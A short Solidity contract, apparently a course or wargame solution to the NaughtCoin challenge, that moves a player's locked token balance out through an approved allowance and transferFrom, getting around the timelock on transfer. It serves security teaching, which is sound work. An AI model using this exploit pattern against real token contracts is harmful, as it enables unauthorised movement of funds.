// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import "week8-9-security/NaughtCoin.sol";

contract NaughtCoinAttacker {
    NaughtCoin token;

    constructor(NaughtCoin token_) {
        token = token_;
    }

    function attack() external {
        // This attack expects that the sender has already given this contract
        // allowance to transfer funds
        address player = msg.sender;
        uint256 balance = token.balanceOf(player);
        token.transferFrom(player, address(this), balance);
        console.log("balanceOf", token.balanceOf(address(this)));
    }
}
